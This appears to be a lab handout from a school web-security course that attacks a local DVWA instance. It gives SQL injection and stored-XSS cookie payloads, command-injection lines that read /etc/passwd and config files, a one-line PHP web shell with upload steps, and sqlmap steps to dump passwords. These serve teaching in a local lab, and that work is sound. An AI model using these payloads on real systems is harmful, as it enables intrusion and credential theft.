# Demo: WEB-APP DVWA - summary

you will:

- [x] learn what to avoid using **DVWA** (damn vulnerable web app)
- [x] learn how easy it is to gather information using **SQLMAP** as a hacking-tool

## L: install dvwa using docker

- /SEC/SEC-WEB/01-DEMO-dvwa/docker-scripts-dvwa/readme.txt
- ```docker pull vulnerables/web-dvwa```

## L: sql-injection

~~~bash 
2' OR '1'='1

see the sql-statement:
select ... from users where user_id=' 2' OR '1'='1 '
~~~

- see different security-levels and how to avoid sql-injection 
- (see: /SEC/SEC-WEB/01-DEMO-dvwa/DEMO-01-dvwa.pdf)

## L: XSS stored

~~~ html
<iframe src="http://www.htl-salzburg.ac.at"></iframe>
<script>alert (document.cookie);</script>
~~~

## L: Command Injection

~~~ bash
127.0.0.1 ; ls -lR /var/www/html/dvwa
127.0.0.1 ; find / -name "*config*"
127.0.0.1 ; pwd
127.0.0.1 ; whoami
127.0.0.1 ; id
127.0.0.1 ; ps -aux
127.0.0.1 ; uname -a & users & w
127.0.0.1 ; cat /etc/group
127.0.0.1 ; cat /etc/passwd
~~~

- see: regex and php

## L: Upload DVWA

- file: hack.php

~~~ php
<?php echo exec($_GET['cmd']);?>
~~~

1. upload hack.php
2. [http://localhost/dvwa/hackable/uploads/hack.php?cmd=ls](http://localhost/dvwa/hackable/uploads/hack.php?cmd=ls)

## S: study PHP: SECURITY-TIPPS

see **/courses/SEC/SEC-WEB/01-DEMO-dvwa/DEMO-01-dvwa.pdf**

## L+S: upload shell.php

- see script: SEC/SEC-WEB/scripts/php/

1. download shell.php from [https://github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)
2. upload shell.php
3. [http://localhost/dvwa/hackable/uploads/shell.php](http://localhost/dvwa/hackable/uploads/shell.php)
4. try some commands:

~~~ bash
    - ls
    - cd /
    - pwd
    - id
    - ls -lR /var/www/html/dvwa
    - find / -name "*config*"
~~~

## S: upload phpshell.php

1. download phpshell-2.5.tar.gz from [https://phpshell.sourceforge.io/](https://phpshell.sourceforge.io/)
2. upload file phpshell-2.5.tar.gz and untar with [http://localhost/dvwa/hackable/uploads/hack.php?cmd=tar%20xfz%20phpshell-2.5.tar.gz](http://localhost/dvwa/hackable/uploads/hack.php?cmd=tar%20xfz%20phpshell-2.5.tar.gz)
3. run php-Shell with [http://localhost/dvwa/hackable/uploads/phpshell-2.5/phpshell.php](http://localhost/dvwa/hackable/uploads/phpshell-2.5/phpshell.php)
4. read file INSTALL

~~~ bash
  - [users]
  - informatik= "comein"
~~~

## L+S: SQLMAP: Hacking Mysql-Server of a WEB-APP (dvwa)

use hacking-tool **sqlmap** for INFORMATION gathering:

- [x] use XSS (stored) to get session-id
- [x] use sqlmap to get DB-information (what database, tables, user, passwords, ...)
- [x] use sqlmap to get login passwords

study /SEC/SEC-WEB/scripts/sqlmap/Makefile

- use XSS to get PHPSESSID
  - ```<script>alert (document.cookie);</script>``` and
- in Makefile adapt: PHPSESSID
- in Makefile adapt: BASEURL http://localhost:8800
  - make 2
  - make 3
  - make 4
  - make 5
  - make 6
  - ... (use default answers by typing enter )